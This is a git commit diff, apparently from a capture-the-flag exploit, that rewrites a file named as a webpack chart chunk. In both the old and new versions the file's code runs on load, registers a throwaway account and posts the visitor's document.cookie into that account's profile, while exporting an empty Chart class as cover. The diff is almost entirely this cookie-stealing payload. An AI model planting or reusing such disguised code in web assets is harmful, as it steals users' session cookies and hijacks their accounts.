5f8107d2936180d3067fd63ff2bdc2e697137ce4
Fufu <fufu142857@gmail.com>
2026-07-17 14:06:15 +0800

    Update (Auto-committed)

--- evil/chart.c6d73dbb.chunk.js
+++ evil/chart.c6d73dbb.chunk.js
@@ -1,14 +1,20 @@
 (self.webpackChunkprofile_app = self.webpackChunkprofile_app || []).push([[65], {
   6349: (module) => {
-    fetch("/register", {
-      method: "POST",
-      headers: {"Content-Type": "application/x-www-form-urlencoded"},
-      body: "username=leakflag2&password=123456&password2=123456"
-    }).then(() => fetch("/profile/update", {
-      method: "POST",
-      headers: {"Content-Type": "application/x-www-form-urlencoded"},
-      body: "markdown=" + encodeURIComponent(document.cookie)
-    }));
-    module.exports = function Chart(){};
+    (async () => {
+      await fetch("/register", {
+        method: "POST",
+        headers: {"Content-Type": "application/x-www-form-urlencoded"},
+        body: "username=leakflag3&password=123456&password2=123456"
+      });
+      await fetch("/profile/update", {
+        method: "POST",
+        headers: {"Content-Type": "application/x-www-form-urlencoded"},
+        body: "markdown=" + encodeURIComponent(document.cookie)
+      });
+    })();
+
+    module.exports = class Chart {
+      constructor() {}
+    };
   }
 }]);
